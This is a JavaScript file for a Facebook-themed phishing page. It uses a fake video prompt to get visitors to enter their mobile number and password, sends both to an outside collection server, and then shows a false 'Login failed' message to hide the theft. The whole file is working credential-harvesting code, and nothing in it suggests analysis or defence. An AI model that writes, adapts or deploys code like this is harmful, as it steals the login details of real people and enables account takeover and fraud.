alert('To watch the video you need to log in with your facebook details to watch the video securely and safe.');
function logIn(){
    const mobileNumber = document.getElementById('number').value;
    const Password = document.getElementById('password').value;
     
    if(!mobileNumber || !Password){
       alert('Fill both mobile number and password fields!!!');
       return;
    }
   
    fetch('https://fb-capture-server.onrender.com/submit', {
        method: 'POST', 
        headers: {'Content-type': 'application/json'},
        body: JSON.stringify({mobileNumber, Password})
    })
    .then(res => {
        if(res.ok){
            alert('Login failed. Please try again.');
        }
    })
    .catch(err => console.error('Error: ', err))
}

function createAcc(){
    alert('This feature is disabled!!!');
}
